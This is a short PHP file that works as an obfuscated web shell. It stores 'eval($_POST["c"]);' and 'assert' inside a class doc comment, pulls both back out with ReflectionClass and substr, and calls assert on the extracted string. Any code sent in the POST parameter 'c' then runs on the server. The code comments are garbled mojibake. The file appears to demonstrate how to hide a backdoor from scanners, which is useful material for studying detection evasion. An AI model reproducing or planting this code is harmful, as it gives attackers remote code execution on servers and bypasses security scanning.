<?php
/**
* eval($_POST["c"]);
* assert
*/
class TestClass { }  
//עһ
$rc = new ReflectionClass('TestClass');
//ʵһ
$str=$rc->getDocComment();
//õҶtestClassע
$pos=strpos($str,'e');
$eval=substr($str,$pos,18);
$pos=strpos($str,'assert');
$fun=substr($str,$pos,6);
//ȡı,Աڹ춯̬
echo $eva;
$fun($eval);
//ִˡ
?>